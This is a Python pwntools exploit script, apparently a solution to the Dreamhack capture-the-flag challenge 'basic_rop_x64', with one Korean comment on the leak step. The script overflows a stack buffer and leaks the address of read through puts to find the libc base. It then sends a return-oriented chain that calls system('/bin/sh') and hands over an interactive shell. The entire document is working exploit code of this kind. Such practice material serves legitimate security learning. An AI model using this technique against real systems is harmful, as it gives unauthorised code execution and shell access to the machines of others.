from pwn import *

# context.log_level = 'debug'

p = remote('host3.dreamhack.games', 9259)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

main = 0x4007ba
pop1 = 0x400883
ret = 0x4005a9
read_got = e.got['read']
puts_plt = e.plt['puts']


#일단 read의 주소를 찾아서 libc base를 찾아보자
buf = b'A' * 0x40 + b'A' * 0x8
buf += p64(pop1) + p64(read_got) + p64(puts_plt)
buf += p64(ret) + p64(main)
p.send(buf)
p.recvn(0x40)

read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + list(libc.search(b'/bin/sh'))[0]

buf = b'A' * 0x48
buf += p64(pop1) + p64(binsh)
buf += p64(system)
p.send(buf)

p.interactive()